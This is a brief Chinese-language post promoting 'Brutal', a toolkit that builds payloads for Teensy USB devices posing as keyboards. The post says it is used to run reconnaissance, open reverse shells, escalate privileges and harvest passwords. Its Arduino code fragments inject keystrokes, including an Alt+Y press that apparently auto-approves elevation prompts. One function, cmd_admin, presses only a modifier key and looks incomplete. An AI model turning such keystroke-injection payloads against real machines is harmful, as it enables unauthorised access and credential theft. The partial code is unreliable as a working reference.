背景介绍：

Teensy像橡皮鸭，t对于在目标机器上执行脚本非常有用，无需人机键盘交互（HID-ATTACK）。当您插入设备时，它将被检测为键盘，并使用微处理器和板载闪存存储器，你可以发送一个非常快速的击键到目标的机器，并完全妥协，无论自动运行。我在我的安全测试中使用它来运行侦察或枚举脚本，执行反向shell，利用本地DLL劫持/特权升级漏洞，并获取所有密码。现在im开发新工具的名字是Brutal

Brutal是一个工具包，用于快速创建人机接口设备的各种有效负载，powershell攻击，病毒攻击和启动侦听器

void loop(){
// blink quickly when complete
digitalWrite(LED_PIN, HIGH);
delay(ds/2);
digitalWrite(LED_PIN, LOW);
delay(ds/2);
}

void show_desktop(){
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_D);
Keyboard.send_now();
delay(500);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
void send_altyes(){
delay(1000);
Keyboard.set_modifier(MODIFIERKEY_ALT);
Keyboard.set_key1(KEY_Y);
Keyboard.send_now();
delay(100);

Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}

void cmd_admin(){
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);

delay(2000);

Keyboard.send_now();

delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
}
